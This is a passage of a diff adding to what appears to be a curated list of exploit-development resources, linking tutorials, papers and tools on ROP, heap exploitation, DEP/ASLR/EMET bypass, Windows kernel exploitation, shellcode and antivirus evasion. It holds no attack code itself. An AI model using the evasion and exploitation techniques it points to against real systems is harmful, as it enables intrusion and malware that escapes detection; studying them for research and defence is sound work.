+    Tuesday of each month. Bad guys, good guys, and many in-between compare the
+    newly released patches to the unpatched version of the files to identify the
+    security fixes. Many organizations take weeks to patch and the faster
+    someone can reverse engineer the patches and get a working exploit written,
+    the more valuable it is as an attack vector. Analysis also allows a
+    researcher to identify common ways that Microsoft fixes bugs which can be
+    used to find 0-days. Microsoft has recently moved to mandatory cumulative
+    patches which introduces complexity in extracting patches for analysis. Join
+    me in this presentation while I demonstrate the analysis of various patches
+    and exploits, as well as the best-known method for modern patch extraction.
+
+##### Corelan
+
+* [Exploit writing tutorial part 10 : Chaining DEP with ROP – the Rubik’s[TM] Cube](https://www.corelan.be/index.php/2010/06/16/exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubikstm-cube/)
+* [Exploit writing tutorial part 11 : Heap Spraying Demystified](https://www.corelan.be/index.php/2011/12/31/exploit-writing-tutorial-part-11-heap-spraying-demystified/)
+
+###### FuzzySecurity
+
+* [Part 9: Spraying the Heap [Chapter 2: Use-After-Free] – Finding a needle in a Haystack](https://www.fuzzysecurity.com/tutorials/expDev/11.html)
+
+### AV Bypass Methods
+
+#### Talks/Presentations
+
+* [Easy Ways To Bypass Anti-Virus Systems - Attila Marosi -Trooper14](https://www.youtube.com/watch?v=Sl1Sru3OwJ4)
+* [Muts Bypassing AV in Vista/Pissing all over your AV](https://web.archive.org/web/20130514172102/http://www.shmoocon.org/2008/videos/Backtrack%20Demo.mp4)
+
+  * Presentation, listed here as it was a bitch finding a live copy
+
+#### Tools
+
+* [SideStep](https://github.com/codewatchorg/SideStep)
+
+  * SideStep is yet another tool to bypass anti-virus software. The tool
+    generates Metasploit payloads encrypted using the CryptoPP library (license
+    included), and uses several other techniques to evade AV.
+
+* [UniByAv](https://github.com/Mr-Un1k0d3r/UniByAv)
+
+  * UniByAv is a simple obfuscator that take raw shellcode and generate
+    executable that are Anti-Virus friendly. The obfuscation routine is purely
+    writtend in assembly to remain pretty short and efficient. In a nutshell the
+    application generate a 32 bits xor key and brute force the key at run time
+    then perform the decryption of the actually shellcode.
+
+#### Writeups
+
+* [Learn how to hide your trojans, backdoors, etc from anti virus.](https://www.hellboundhackers.org/articles/read-article.php?article_id=842)
+* [[Virus] Self-modifying code-short overview for beginners](http://phimonlinemoinhat.blogspot.com/2010/12/virus-self-modifying-code-short.html)
+
+### bypass-ep Bypassing Exploit Protections/Mitigations & Corresponding literature
+
+* [A Brief History of Exploit Techniques and Mitigations on Windows](http://www.hick.org/~mmiller/presentations/misc/exploitation_techniques_and_mitigations_on_windows.pdf)
+* [Windows Exploit Protection History/Overview - Compass Security](https://exploit.courses/files/bfh2017/day6/0x60_WindowsExploiting.pdf)
+* [Toward mitigating arbitrary native code execution in Windows 10](https://github.com/Microsoft/MSRC-Security-Research/blob/master/presentations/2017_05_SysScan360_Seattle/SyScan360_Miller_Towards_Mitigating_Arbitrary_Native_Code_Execution.pdf)
+* [Strengthening the Microsoft Edge Sandbox](https://blogs.windows.com/msedgedev/2017/03/23/strengthening-microsoft-edge-sandbox/#Y6ziSVVBqc1TPHFp.97)
+* [Mitigating arbitrary native code execution in Microsoft Edge](https://blogs.windows.com/msedgedev/2017/02/23/mitigating-arbitrary-native-code-execution/#fAlvade7vV0bQrWs.97)
+
+#### Stack Protections
+
+##### Reference Material
+
+* [Stack Smashing Protector](http://wiki.osdev.org/Stack_Smashing_Protector)
+
+#### DEP/SEHop/ASLR
+
+* [Fun With Info-Leaks(DEP+ASLR bypass)](https://rh0dev.github.io/blog/2015/fun-with-info-leaks/)
+
+  * This article is about information leaks in form of memory disclosures
+    created in Internet Explorer 10 32-bit on Windows 7 64-bit. They are used to
+    bypass full ASLR/DEP to gain remote code execution. While the software
+    containing the bug might not be that popular, it?s quite nice what can be
+    done with the bug.
+
+* [Bypassing Windows Hardware-enforced Data Execution Prevention Oct 2, 2005](http://www.uninformed.org/?v=2&a=4&t=txt)
+* [Bypassing Windows Hardware-enforced DEP ](http://uninformed.org/?v=all&a=11&t=sumry)
+
+  * This paper describes a technique that can be used to bypass Windows
+    hardware-enforced Data Execution Prevention (DEP) on default installations
+    of Windows XP Service Pack 2 and Windows 2003 Server Service Pack 1. This
+    technique makes it possible to execute code from regions that are typically
+    non-executable when hardware support is present, such as thread stacks and
+    process heaps. While other techniques have been used to accomplish similar
+    feats, such as returning into NtProtectVirtualMemory, this approach requires
+    no direct reprotecting of memory regions, no copying of arbitrary code to
+    other locations, and does not have issues with NULL bytes. The result is a
+    feasible approach that can be used to easily bypass the enhancements offered
+    by hardware-enforced DEP on Windows in a way that requires very minimal
+    modifications to existing exploits.
+
+* [Exploit Writeup on Flash vuln explaining use of ASLR + DEP bypass](http://www.semantiscope.com/research/BHDC2010/BHDC-2010-Slides-v2.pdf)
+* [DEP/ASLR bypass without ROP/JIT](https://cansecwest.com/slides/2013/DEP-ASLR
+  bypass without ROP-JIT.pdf)
+* [Slides, codes and videos of the talk "DEP/ASLR bypass without ROP/JIT" on CanSecWest 2013](https://github.com/tombkeeper/DEP-and-ASLR-bypass-without-ROP-or-JIT)
+
+##### Reference Material
+
+* [Understanding DEP as a mitigation Technology](http://blogs.technet.com/b/srd/archive/2009/06/05/understanding-dep-as-a-mitigation-technology-part-1.aspx)
+* [Preventing the Exploitation of SEH Overwrites](http://uninformed.org/?v=all&a=24&t=sumry)
+
+  * This paper proposes a technique that can be used to prevent the exploitation
+    of SEH overwrites on 32-bit Windows applications without requiring any
+    recompilation. While Microsoft has attempted to address this attack vector
+    through changes to the exception dispatcher and through enhanced compiler
+    support, such as with /SAFESEH and /GS, the majority of benefits they offer
+    are limited to image files that have been compiled to make use of the
+    compiler enhancements. This limitation means that without all image files
+    being compiled with these enhancements, it may still be possible to leverage
+    an SEH overwrite to gain code execution. In particular, many third-party
+    applications are still vulnerable to SEH overwrites even on the latest
+    versions of Windows because they have not been recompiled to incorporate
+    these enhancements. To that point, the technique described in this paper
+    does not rely on any compile time support and instead can be applied at
+    runtime to existing applications without any noticeable performance
+    degradation. This technique is also backward compatible with all versions of
+    Windows NT+, thus making it a viable and proactive solution for legacy
+    installations.
+
+* [Understanding DEP as a mitigation Technology](http://blogs.technet.com/b/srd/archive/2009/06/05/understanding-dep-as-a-mitigation-technology-part-1.aspx)
+* [Preventing the Exploitation of Structured Exception Handler (SEH) Overwrites with SEHOP](http://blogs.technet.com/b/srd/archive/2009/02/02/preventing-the-exploitation-of-seh-overwrites-with-sehop.aspx)
+
+##### Writeups
+
+* [Defeating the Matasano C++ Challenge with ASLR enabled](http://timetobleed.com/defeating-the-matasano-c-challenge-with-aslr-enabled/)
+
+#### CFG/EMET
+
+* [Exploring Control-Flow-Guard in Windows10](http://sjc1-te-ftp.trendmicro.com/assets/wp/exploring-control-flow-guard-in-windows10.pdf)
+* [Bypassing EMET's EAF with custom shellcode using kernel pointer](https://www.greyhathacker.net/?p=483)
+* [Bypassing EMET 4.1](http://labs.bromium.com/2014/02/24/bypassing-emet-4-1/)
+* [Paper](https://bromiumlabs.files.wordpress.com/2014/02/bypassing-emet-4-1.pdf)
+* [Disarming and Bypassing EMET 5.1 - OffSec](http://www.offensive-security.com/vulndev/disarming-and-bypassing-emet-5-1/)
+* [Bypassing Microsoft EMET 5.1 . Yet again.](http://blog.sec-consult.com/2014/11/bypassing-microsoft-emet-51-yet-again.html)
+* [Disarming and Bypassing EMET 5.1](https://www.offensive-security.com/vulndev/disarming-and-bypassing-emet-5-1/)
+* [Defeating EMET 5.2 Protections - Part 1](http://casual-scrutiny.blogspot.in/2015/03/defeating-emet-52.html)
+* [Defeating EMET 5.2 Protections - Part 2](http://casual-scrutiny.blogspot.in/2015/03/defeating-emet-52-protections-2.html)
+* [Bypassing EMET 5.2 Protection](http://adsecurity.org/?p=1487)
+* [BYPASSING EMET Export Address Table Access Filtering feature](http://piotrbania.com/all/articles/anti_emet_eaf.txt)
+* [Disarming Control Flow Guard Using Advanced Code Reuse Attacks](https://www.endgame.com/blog/disarming-control-flow-guard-using-advanced-code-reuse-attacks)
+* [BYPASS CONTROL FLOW GUARD COMPREHENSIVELY - Zhang Yunhai](https://www.blackhat.com/docs/us-15/materials/us-15-Zhang-Bypass-Control-Flow-Guard-Comprehensively-wp.pdf)
+* [Proposed Windows 10 EAF/EMET "Bypass" for Reflective DLL Injection](https://zerosum0x0.blogspot.com/2017/06/proposed-eafemet-bypass-for-reflective.html?m=1)
+
+##### Reference
+
+* [Exploit Mitigation Killchain](http://0xdabbad00.com/wp-content/uploads/2013/04/exploit_mitigation_kill_chain.pdf)
+
+#### DeviceGuard
+
+* [Bypassing Device Guard with .NET Assembly Compilation Methods](http://www.exploit-monday.com/2017/07/bypassing-device-guard-with-dotnet-methods.html)
+
+### obfuscation Obfuscation/Polyglots
+
+* [Obfuscating python](https://reverseengineering.stackexchange.com/questions/1943/what-are-the-techniques-and-tools-to-obfuscate-python-programs)
+* [Code segment encryption](http://blog.sevagas.com/?Code-segment-encryption)
+* [Using ARM Inline Assembly and Naked Functions to fool Disassemblers](http://www.evilsocket.net/2015/05/02/using-inline-assembly-and-naked-functions-to-fool-disassemblers/#sthash.Gt6f7f7y.4pLres53.sfju)
+* [X86 Shellcode Obfuscation - Part 1 - breakdev.org](https://breakdev.org/x86-shellcode-obfuscation-part-1/)
+* [Less is More, Exploring Code/Process-less Techniques and Other Weird Machine Methods to Hide Code (and How to Detect Them)](https://cansecwest.com/slides/2014/less%20is%20more3.pptx)
+* [BMP / x86 Polyglot](https://warroom.securestate.com/bmp-x86-polyglot/)
+* [Meterpreter Payload Stage 1 with Obsfuscation and Evasion](https://github.com/lockfale/meterpreterjank)
+
+### ARM Specific
+
+* [armpwn](https://github.com/saelo/armpwn)
+
+  * Repository to train/learn memory corruption exploitation on the ARM
+    platform. This is the material of a workshop I prepared for my CTF Team.
+
+* [Too LeJIT to Quit: Extending JIT Spraying to ARM](http://www.internetsociety.org/sites/default/files/09_3_2.pdf)
+
+### Linux Specific Exploit Development
+
+* [Pool Blade: A new approach for kernel pool exploitation](https://zdresearch.com/pool-blade-a-new-approach-for-kernel-pool-exploitation/)
+* [64-bit Linux Return-Oriented Programming - Standford](https://crypto.stanford.edu/~blynn/rop/)
+* [Linux ASLR integer overflow: Reducing stack entropy by four](http://hmarco.org/bugs/linux-ASLR-integer-overflow.html)
+
+  * A bug in Linux ASLR implementation for versions prior to 3.19-rc3 has been
+    found. The issue is that the stack for processes is not properly randomized
+    on some 64 bit architectures due to an integer overflow. This is a writeup
+    of the bug and how to fix it.
+
+* [Linux GLibC Stack Canary Values](https://xorl.wordpress.com/2010/10/14/linux-glibc-stack-canary-values/)
+* [Cheating the ELF - Subversive Dynamic Linking to Libraries](http://www.cs.dartmouth.edu/~sergey/cs108/2010/subversiveld.pdf)
+* [Return into Lib(C) Theory Primer(Security-Tube)](http://www.securitytube.net/video/257)
+* [Understanding glibc malloc](https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/)
+* [Resolving the Base Pointer of the Linux Program Interpreter with Shellcode](https://web-beta.archive.org/web/20160720084253/http://howto.hackallthethings.com:80/2015/03/resolving-base-pointer-of-linux-program.html)
+* [rappel](https://github.com/yrp604/rappel/)
+
+  * Rappel is a pretty janky assembly REPL. It works by creating a shell ELF,
+    starting it under ptrace, then continiously rewriting/running the .text
+    section, while showing the register states. It's maybe half done right now,
+    and supports Linux x86, amd64, armv7 (no thumb), and armv8 at the moment.(As
+    of Aug 2017) Sensepost Series on Linux Heap Exploitation (Intro level)
+
+* [Painless intro to the Linux userland heap](https://sensepost.com/blog/2017/painless-intro-to-the-linux-userland-heap/)
+* [Linux Heap Exploitation Intro Series: Used and Abused – Use After Free](https://sensepost.com/blog/2017/linux-heap-exploitation-intro-series-used-and-abused-use-after-free/)
+* [Linux Heap Exploitation Intro Series: The magicians cape – 1 Byte Overflow](https://sensepost.com/blog/2017/linux-heap-exploitation-intro-series-the-magicians-cape-1-byte-overflow/)
+
+### Windows Specific
+
+#### General
+
+* [Writing Exploits for Win32 Systems from Scratch](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2016/june/writing-exploits-for-win32-systems-from-scratch/)
+* [Windows DLL-Injection basics](http://blog.opensecurityresearch.com/2013/01/windows-dll-injection-basics.html)
+* [Writing Exploits for Win32 Systems from Scratch](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2016/june/writing-exploits-for-win32-systems-from-scratch/)
+* [Portable Executable Injection For Beginners](http://www.malwaretech.com/2013/11/portable-executable-injection-for.html)
+* [ActiveX - Active Exploitation](http://uninformed.org/?v=all&a=41&t=sumry)
+
+  * This paper provides a general introduction to the topic of understanding
+    security vulnerabilities that affect ActiveX controls. A brief description
+    of how ActiveX controls are exposed to Internet Explorer is given along with
+    an analysis of three example ActiveX vulnerabilities that have been
+    previously disclosed.
+
+* [Exploiting the Otherwise Non-Exploitable on Windows](http://uninformed.org/?v=all&a=22&t=sumry)
+
+  * This paper describes a technique that can be applied in certain situations
+    to gain arbitrary code execution through software bugs that would not
+    otherwise be exploitable, such as NULL pointer dereferences. To facilitate
+    this, an attacker gains control of the top-level unhandled exception filter
+    for a process in an indirect fashion. While there has been previous work
+    illustrating the usefulness in gaining control of the top-level unhandled
+    exception filter, Microsoft has taken steps in XPSP2 and beyond, such as
+    function pointer encoding, to prevent attackers from being able to overwrite
+    and control the unhandled exception filter directly. While this security
+    enhancement is a marked improvement, it is still possible for an attacker to
+    gain control of the top-level unhandled exception filter by taking advantage
+    of a design flaw in the way unhandled exception filters are chained. This
+    approach, however, is limited by an attacker's ability to control the
+    chaining of unhandled exception filters, such as through the loading and
+    unloading of DLLs. This does reduce the global impact of this approach;
+    however, there are some interesting cases where it can be immediately
+    applied, such as with Internet Explorer.
+
+* [Microsoft Patch Analysis for Exploitation](https://www.irongeek.com/i.php?page=videos/bsidescharm2017/bsidescharm-2017-t111-microsoft-patch-analysis-for-exploitation-stephen-sims)
+
+  * Since the early 2000's Microsoft has distributed patches on the second
+    Tuesday of each month. Bad guys, good guys, and many in-between compare the
+    newly released patches to the unpatched version of the files to identify the
+    security fixes. Many organizations take weeks to patch and the faster
+    someone can reverse engineer the patches and get a working exploit written,
+    the more valuable it is as an attack vector. Analysis also allows a
+    researcher to identify common ways that Microsoft fixes bugs which can be
+    used to find 0-days. Microsoft has recently moved to mandatory cumulative
+    patches which introduces complexity in extracting patches for analysis. Join
+    me in this presentation while I demonstrate the analysis of various patches
+    and exploits, as well as the best-known method for modern patch extraction.
+
+* [Microsoft Patch Analysis for Exploitation Stephen Sims](https://www.youtube.com/watch?v=LHNcBVQF1tM)
+* [Vulnserver](http://www.thegreycorner.com/2010/12/introducing-vulnserver.html)
+
+  * I have just released a program named Vulnserver - a Windows based threaded
+    TCP server application that is designed to be exploited.
+
+#### Windows Kernel Exploitation
+
+* [Windows Kernel Exploitation 101 : Exploiting CVE - 2014 - 4113](https://www.exploit-db.com/docs/39665.pdf)
+* [Windows Kernel-mode Payload Fundamentals](http://uninformed.org/?v=all&a=15&t=sumry)
+
+  * This paper discusses the theoretical and practical implementations of
+    kernel-mode payloads on Windows. At the time of this writing, kernel-mode
+    research is generally regarded as the realm of a few, but it is hoped that
+    documents such as this one will encourage a thoughtful progression of the
+    subject matter. To that point, this paper will describe some of the general
+    techniques and algorithms that may be useful when implementing kernel-mode
+    payloads. Furthermore, the anatomy of a kernel-mode payload will be broken
+    down into four distinct units, known as payload components, and explained in
+    detail. In the end, the reader should walk away with a concrete
+    understanding of the way in which kernel-mode payloads operate on Windows.
+
+* [Intro to Windows kernel exploitation 1/N: Kernel Debugging](https://www.whitehatters.academy/intro-to-kernel-exploitation-part-1/)
+* [Intro to Windows kernel exploitation 2/N: HackSys Extremely Vulnerable Driver](https://www.whitehatters.academy/intro-to-windows-kernel-exploitation-2-windows-drivers/)
+* [A Window into Ring0 - Paper](https://labs.mwrinfosecurity.com/publications/a-window-into-ring0/) \*
+  With the rise of sandboxes and locked down user accounts attackers are
+  increasingly resorting to attacking kernel mode code to gain full access to
+  compromised systems. The talk provided an overview of the Windows kernel mode
+  attack surface and how to interact with it. It then went on to cover the tools
+  available for finding bugs in Windows kernel mode code and drivers as well as
+  highlighting some of the lower hanging fruit, common mistakes and the steps
+  being taken (or lack of steps being taken) to mitigate the risks posed. The
+  talk also covered common exploitation techniques to gather information about
+  the state of kernel mode memory and to gain code execution as SYSTEM. Finally
+  the talk walked through exploiting CVE-2016-7255 on modern 64 bit versions of
+  Windows.
+
+* [Securi-Tay 2017 - A Window into Ring0](https://www.youtube.com/watch?v=DLND8bKv27w)
+
+  * With the rise of sandboxes and locked down user accounts attackers are
+    increasingly resorting to attacking kernel mode code to gain full access to
+    compromised systems. This talk aims to provide an overview of the Windows
+    kernel mode attack surface and how to interact with it. This talk will
+    demonstrate the tools available for finding bugs in Windows kernel mode code
+    and drivers together with highlighting some of the lower hanging fruit,
+    common mistakes and the steps being taken (or lack of steps being taken) to
+    mitigate the risks posed. The talk will then cover common exploitation
+    techniques to gather information about the state of kernel mode memory and
+    to gain code execution as SYSTEM using examples from publicly known
+    exploits.
+
+* [I Know Where Your Page Lives: Derandomizing the latest Windows 10 Kernel - ZeroNights 2016](https://github.com/IOActive/I-know-where-your-page-lives)
+* [HackSys Extreme Vulnerable Driver](http://www.payatu.com/hacksys-extreme-vulnerable-driver/)
+
+  * HackSys Extreme Vulnerable Driver is intentionally vulnerable Windows driver
+    developed for security enthusiasts to learn and polish their exploitation
+    skills at Kernel level.
+  * HackSys Extreme Vulnerable Driver caters wide range of vulnerabilities
+    ranging from simple Buffer Overflows to complex Use After Frees and Pool
+    Overflows. This allows the researchers to explore the exploitation
+    techniques for all the implemented vulnerabilities.z6z
+
+* [Windows-driver-samples](https://github.com/Microsoft/Windows-driver-samples)
+
+  * This repo contains driver samples prepared for use with Microsoft Visual
+    Studio and the Windows Driver Kit (WDK). It contains both Universal Windows
+    Driver and desktop-only driver samples.
+
+* [DriverBuddy](https://github.com/nccgroup/DriverBuddy)
+
+  * DriverBuddy is an IDA Python script to assist with the reverse engineering
+    of Windows kernel drivers.
+
+* [Blog post](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2016/november/driverbuddy-tool-release/)
+* [win_driver_plugin](https://github.com/mwrlabs/win_driver_plugin) \* A tool to
+  help when dealing with Windows IOCTL codes or reversing Windows drivers.
+
+* [Write your first driver - docs ms](https://docs.microsoft.com/en-us/windows-hardware/drivers/gettingstarted/writing-your-first-driver)
+* [Advanced Windows Debugging: Memory Corruption Part II—Heaps](http://www.informit.com/articles/article.aspx?p=1081496)
+
+  * Daniel Pravat and Mario Hewardt discuss security vulnerabilities and
+    stability issues that can surface in an application when the heap is used in
+    a nonconventional fashion.
+
+* [Sharks in the Pool :: Mixed Object Exploitation in the Windows Kernel PoolSharks in the Pool :: Mixed Object Exploitation in the Windows Kernel Pool](http://srcincite.io/blog/2017/09/06/sharks-in-the-pool-mixed-object-exploitation-in-the-windows-kernel-pool.html)
+* [Analysing the NULL SecurityDescriptor kernel exploitation mitigation in the latest Windows 10 v1607 Build 14393](https://labs.nettitude.com/blog/analysing-the-null-securitydescriptor-kernel-exploitation-mitigation-in-the-latest-windows-10-v1607-build-14393/)
+
+#### SEH/SE-HOP Defeat/Bypass
+
+* [Bypassing SEHOP](https://repo.zenk-security.com/Reversing%20.%20cracking/Bypassing%20SEHOP.pdf)
+* [Great Writeup/Example of SEH Bypass](http://www.primalsecurity.net/0x3-exploit-tutorial-buffer-overflow-seh-bypass/)
+* [SEH Overwrites Simplified v1.01](http://repo.palkeo.com/hacking/bas%20niveau/SEH%20overwrite.pdf)
+* [(SEH Bypass)Defeating the Stack Based Buffer Overflow Prevention Mechanism of Microsoft Windows 2003 Server.](https://www.blackhat.com/presentations/bh-asia-03/bh-asia-03-litchfield.pdf)
+* [A Crash Course on the Depths of Win32? Structured Exception Handling](https://www.microsoft.com/msj/0197/exception/exception.aspx)
+* [Intro to Windows kernel exploitation 1/N: Kernel Debugging](https://www.whitehatters.academy/intro-to-kernel-exploitation-part-1/)
+* [Win32 Assembly Components - Last Stage of Delirium Research Group](http://www.bandwidthco.com/whitepapers/programming/asm/Win32%20Assembly%20Components.pdf)
+* [Preventing the Exploitation of Structured Exception Handler (SEH) Overwrites with SEHOP](https://blogs.technet.microsoft.com/srd/2009/02/02/preventing-the-exploitation-of-structured-exception-handler-seh-overwrites-with-sehop/)
+* [Structured Exception Handling - TechNet](https://msdn.microsoft.com/en-us/library/windows/desktop/ms680657%28v=vs.85%29.aspx)
+* [Defeating Microsoft Windows XP SP2 Heap protection and DEP bypass ](https://www.ptsecurity.com/upload/corporate/ww-en/download/defeating-xpsp2-heap-protection.pdf)
+
+#### Windows Heap Exploitation
+
+* [Reliable Windows Heap Exploits](http://xcon.xfocus.org/XCon2004/archives/14_Reliable%20Windows%20Heap%20Exploits_BY_SHOK.pdf)
+* [Windows 10 HAL’s Heap – Extinction of the "HalpInterruptController" Table Exploitation Technique Another kernel exploitation technique killed in Windows 10 Creators Update](https://labs.bluefrostsecurity.de/blog/2017/05/11/windows-10-hals-heap-extinction-of-the-halpinterruptcontroller-table-exploitation-technique/)
+* [WinHeap-Explorer](https://github.com/WinHeapExplorer/WinHeap-Explorer) \* The
+  efficient and transparent proof-of-concept tool for heap-based bugs detection
+  in x86 machine code for Windows applications.
+
+### Anti-Fuzzing
+
+* [Intro to
+  Anti-Fuzzing](https://www.nccgroup.com/en/blog/2014/01/introduction-to-anti-fuzzing-a-defence-in-depth-aid/()
+
+### Assembly(x86/x64/ARM)
+
+* [X86 Instruction Reference](http://www.Felixcoutier.com/x86)
+* [Awesome Reference for Intel x86/64](http://ref.x86asm.net/)
+
+  * This reference is intended to be precise opcode and instruction set
+    reference (including x86-64). Its principal aim is exact definition of
+    instruction parameters and attributes.
+
+* [Nasm x86 reference](https://www.cs.uaf.edu/2006/fall/cs301/support/x86/)
+* [Intel Pentium Instruction Set Reference (A)](http://faydoc.tripod.com/cpu/index_a.htm)
+* [Iczelion's Win32 Assembly Homepage](http://www.programminghorizon.com/win32assembly/)
+* [cgasm](https://github.com/bnagy/cgasm)
+
+  * cgasm is a standalone, offline terminal-based tool with no dependencies that
+    gives me x86 assembly documentation. It is pronounced "SeekAzzem".
+
+### Anti-Debugging
+
+* [The Ultimate Anti-Debugging Reference(2011)](http://pferrie.host22.com/papers/antidebug.pdf) \*
+  Good reference, though old.
+* [Windows Anti-Debug Reference](http://www.symantec.com/connect/articles/windows-anti-debug-reference)
+
+  * Good, but also old, Nov2010
+
+* [gargoyle, a memory scanning evasion technique](https://jlospinoso.github.io/security/assembly/c/cpp/developing/software/2017/03/04/gargoyle-memory-analysis-evasion.html)
+
+### generaltools General Tools
+
+Check out the 'Reverse Engineering" Section's Tools list for a lot of useful
+tools that aren't listed here.
+
+#### General Tools
+
+* [binwally](https://github.com/bmaia/binwally)
+
+  * Binary and Directory tree comparison tool using the Fuzzy Hashing concept
+    (ssdeep)
+
+* [Using Binwally](http://w00tsec.blogspot.com/2013/12/binwally-directory-tree-diff-tool-using.html)
+* [Equip: python bytecode instrumentation](https://github.com/neuroo/equip)
+
+  * equip is a small library that helps with Python bytecode instrumentation.
+    Its API is designed to be small and flexible to enable a wide range of
+    possible instrumentations. The instrumentation is designed around the
+    injection of bytecode inside the bytecode of the program to be instrumented.
+    However, the developer does not need to know anything about the Python
+    bytecode since the injected code is Python source.
+
+* [lisa.py](https://github.com/ant4g0nist/lisa.py)
+
+  * An Exploit Dev Swiss Army Knife.
+
+* [SCANSPLOIT](https://github.com/huntergregal/scansploit)
+
+  * Exploit using barcodes, QRcodes, earn13, datamatrix
+
+* [sandbox-attacksurface-analysis-tools](https://github.com/google/sandbox-attacksurface-analysis-tools)
+
+  * This is a small suite of tools to test various properties of sandboxes on
+    Windows. Many of the checking tools take a -p flag which is used to specify
+    the PID of a sandboxed process. The tool will impersonate the token of that
+    process and determine what access is allowed from that location. Also it's
+    recommended to run these tools as an administrator or local system to ensure
+    the system can be appropriately enumerated.
+
+* [DotNetToJScript](https://github.com/tyranid/DotNetToJScript)
+
+  * A tool to create a JScript file which loads a .NET v2 assembly from memory.
+
+#### Hunting/Making Exploits Tools(DeBrujinn sequence)
+
+* [Pattern-Create/offset as a python function](https://github.com/jbertman/pattern_create)
+
+  * Metasploit pattern generator in Python, modified to be used as a function
+
+* [!exploitable Crash Analyzer](https://msecdbg.codeplex.com/)
+
+  * !exploitable (pronounced bang exploitable) is a Windows debugging extension
+    (Windbg) that provides automated crash analysis and security risk
+    assessment. The tool first creates hashes to determine the uniqueness of a
+    crash and then assigns an exploitability rating to the crash: Exploitable,
+    Probably Exploitable, Probably Not Exploitable, or Unknown. There is more
+    detailed information about the tool in the following .pptx file or at
+    http://www.microsoft.com/security/msec. Additonally, see the
+    [blog post](http://blogs.technet.com/srd/archive/2009/04/08/the-history-of-the-exploitable-crash-analyzer.aspx),
+    or
+    [watch the video](http://channel9.msdn.com/posts/PDCNews/Bang-Exploitable-Security-Analyzer/).
+
+* [Findjmp2](http://www.securiteam.com/tools/5LP0C1PEUY.html)
+
+  * Findjmp2 is a modified version of Findjmp from eEye.com to find jmp, call,
+    push in a loaded DLL. This version includes search for pop/pop/ret set of
+    instructions that is useful to bypass Windows XP SP2 and Windows 2003 stack
+    protection mechanism.
+
+* [binjitsu](https://github.com/binjitsu/binjitsu/)
+
+  * binjitsu is a CTF framework and exploit development library. Written in
+    Python, it is designed for rapid prototyping and development, and intended
+    to make exploit writing as simple as possible.
+
+#### Shellcode Tools
+
+* [meterssh](https://github.com/trustedsec/meterssh)
+
+  * MeterSSH is a way to take shellcode, inject it into memory then tunnel
+    whatever port you want to over SSH to mask any type of communications as a
+    normal SSH connection.
+
+* [rp++](https://github.com/0vercl0k/rp)
+
+  * rp++ is a full-cpp written tool that aims to find ROP sequences in
+    PE/Elf/Mach-O (doesn't support the FAT binaries) x86/x64 binaries. It is
+    open-source, documented with Doxygen (well, I'm trying to..) and has been
+    tested on several OS: Debian / Windows 7 / FreeBSD / Mac OSX Lion (10.7.3).
+    Moreover, it is x64 compatible. I almost forgot, it handles both Intel and
+    AT&T syntax (beloved BeaEngine). By the way, the tool is a standalone
+    executable ; I will upload static-compiled binaries for each OS.
+
+* [Shellcode_Tools](https://github.com/MarioVilas/shellcode_tools) _
+  Miscellaneous tools written in Python, mostly centered around shellcodes. _
+  bin2py: Embed binary files into Python source code. \* shellcode2exe: Convert
+  shellcodes into executable files for multiple platforms.
+
+* [rp++](https://github.com/0vercl0k/rp)
+
+  * rp++ is a full-cpp written tool that aims to find ROP sequences in
+    PE/Elf/Mach-O x86/x64/ARM binaries. It is open-source and has been tested on
+    several OS: Debian / Windows 8.1 / Mac OSX Lion (10.7.3). Moreover, it is
+    x64 compatible and supports Intel syntax. Standalone executables can also be
+    directly downloaded.
+
+### Decompilers & Disassemblers
+
+* [Bokken](https://inguma.eu/projects/bokken)
+
+  * Bokken is a GUI for the Pyew and Radare projects so it offers almost all the
+    same features that Pyew has and and some of the Radare's ones. It's intended
+    to be a basic disassembler, mainly, to analyze malware and vulnerabilities.
+    Currently Bokken is neither an hexadecimal editor nor a full featured
+    disassembler YET, so it should not be used for deep code analysis or to try
+    to modify files with it.
+
+* [IDA](https://www.hex-rays.com/products/ida/)
+
+  * IDA Pro combines an interactive, programmable, multi-processor disassembler
+    coupled to a local and remote debugger and augmented by a complete plugin
+    programming environment.
+
+* [Overview & Tutorials](https://www.hex-rays.com/products/ida/debugger/index.shtml)
+
+  * Ida Plugins
+
+* [Ida Sploiter](https://thesprawl.org/projects/ida-sploiter/)
+
+    * IDA Sploiter is a plugin for Hex-Ray's IDA Pro disassembler designed to enhance IDA's capabilities as an exploit development and vulnerability research tool. Some of the plugin's features include a powerful ROP gadgets search engine, semantic gadget analysis and filtering, interactive ROP chain builder, stack pivot analysis, writable function pointer search, cyclic memory pattern generation and offset analysis, detection of bad characters and memory holes, and many others.
+
+* [Ida Pomidor](https://thesprawl.org/projects/ida-pomidor/)
+
+  * IDA Pomidor is a fun and simple plugin for the Hex-Ray's IDA Pro
+    disassembler that will help you retain concentration and productivity during
+    long reversing sessions.
+
+* [FLARE-Ida](https://github.com/fireeye/flare-ida)
+
+  * This repository contains a collection of IDA Pro scripts and plugins used by
+    the FireEye Labs Advanced Reverse Engineering (FLARE) team.
+
+* [Hopper](http://www.hopperapp.com/)
+
+  * Hopper is a reverse engineering tool for OS X and Linux, that lets you
+    disassemble, decompile and debug your 32/64bits Intel Mac, Linux, Windows
+    and iOS executables!
+
+* [Reverse](https://github.com/joelpx/reverse)
+
+  * Reverse engineering for x86 binaries (elf-format). Generate a more readable
+    code (pseudo-C) with colored syntax. Warning, the project is still in
+    development, use it at your own risks. This tool will try to disassemble one
+    function (by default main). The address of the function, or its symbol, can
+    be passed by argument.
+
+* [fREedom - capstone based disassembler for extracting to binnavi](https://github.com/cseagle/fREedom)
+
+  * fREedom is a primitive attempt to provide an IDA Pro independent means of
+    extracting disassembly information from executables for use with binnavi
+    (https://github.com/google/binnavi).
+
+* [Setting up fREedom and BinNavi](https://summitroute.com/blog/2015/12/31/setting_up_freedom_and_binnavi/)
+* [BinNavi](https://github.com/google/binnavi)
+
+  * BinNavi is a binary analysis IDE that allows to inspect, navigate, edit and
+    annotate control flow graphs and call graphs of disassembled code.
+
+### Debuggers
+
+#### General/Platform Neutral
+
+* [The Secret Lives of Debuggers - Lance Buttars - BSides SLC15](https://www.youtube.com/watch?v=V8trrmIsdb0)
+
+  * Binaries are files like any text file or a bitmap. They can be modified and
+    changed.With some basic understanding of assembly language anyone can take a
+    binary and modify its execution in a debugger and using a hex editor change
